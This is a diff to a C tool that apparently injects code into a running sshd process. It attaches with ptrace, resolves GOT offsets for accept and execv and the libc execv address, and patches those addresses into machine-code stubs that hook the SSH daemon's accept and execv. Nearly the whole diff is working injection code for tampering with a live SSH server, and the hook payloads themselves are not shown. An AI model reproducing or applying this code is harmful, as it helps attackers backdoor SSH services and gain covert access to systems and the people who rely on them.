@@ -1,4 +1,5 @@
 #include "assemble.h"
+#include "func_offset.h"
 #include "got_offset.h"
 #include "log.h"
 #include "proc_map.h"
@@ -23,37 +24,36 @@
 // clang-format on
 
 #define PADDING 0x10
-#define SSHD_PATH "/usr/sbin/sshd"
+#define SSHD_PATH "/usr/bin/sshd"
 #define SESSION_PATH "/usr/lib/ssh/sshd-session"
+#define LIBC_PATH "/usr/lib/libc.so.6"
 
 #define ACCEPT_HOOK_OFFSET 0x0
-#define EXECV_HOOK_OFFSET 0x229
+#define EXECV_HOOK_OFFSET 0x205
 
 #define CALL_EXECV "\x48\xB8\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xD0"
-#define MOV_RAX "\x48\xB8\xEF\xCD\xAB\x89\x67\x45\x23\x01"
+#define GET_RW "\x48\xB8\xEF\xCD\xAB\x89\x67\x45\x23\x01"
 
 // replace the place_holder to the bytes I need
 void
-preprocess_code (uint32_t pid, uint64_t sshd_base)
+preprocess_code (int32_t pid, uint64_t sshd_base)
 {
-  char *mov_rax_call = CALL_EXECV;
+  char *call_execv = CALL_EXECV;
 
-  uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");
-  uint64_t execv;
-  copy_from_tracee (pid, execv_got, (char *)&execv, 8);
+  uint64_t execv = get_func_offset ("execv", LIBC_PATH);
+  execv += parse_maps (pid, "r--p", LIBC_PATH);
+  call_execv = memmem (sshd_execv, sizeof (sshd_execv), call_execv, 0xc);
+  memcpy (&call_execv[2], &execv, 8);
 
-  mov_rax_call = memmem (sshd_execv, sizeof (sshd_execv), mov_rax_call, 0xc);
-  memcpy (&mov_rax_call[2], &execv, 8);
-
-  char *mov_rax = MOV_RAX;
+  char *get_rw = GET_RW;
   uint64_t sshd_rw_start = sshd_base + get_seg_gap (SSHD_PATH, 6);
 
-  mov_rax = memmem (sshd_accept, sizeof (sshd_accept), mov_rax, 0xa);
-  memcpy (&mov_rax[2], &sshd_rw_start, 0x8);
+  get_rw = memmem (sshd_accept, sizeof (sshd_accept), get_rw, 0xa);
+  memcpy (&get_rw[2], &sshd_rw_start, 0x8);
 
-  mov_rax = MOV_RAX;
-  mov_rax = memmem (sshd_execv, sizeof (sshd_execv), mov_rax, 0xa);
-  memcpy (&mov_rax[2], &sshd_rw_start, 0x8);
+  get_rw = GET_RW;
+  get_rw = memmem (sshd_execv, sizeof (sshd_execv), get_rw, 0xa);
+  memcpy (&get_rw[2], &sshd_rw_start, 0x8);
 }
 
 int
@@ -65,7 +65,7 @@ main (int argc, char **argv)
 
   attach (pid);
   // ptrace (PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
-  uint64_t sshd_base = parse_maps (pid, "r--p");
+  uint64_t sshd_base = parse_maps (pid, "r--p", SSHD_PATH);
   preprocess_code (pid, sshd_base);
 
   uint64_t accept_got = sshd_base + get_got_offset (SSHD_PATH, "accept");
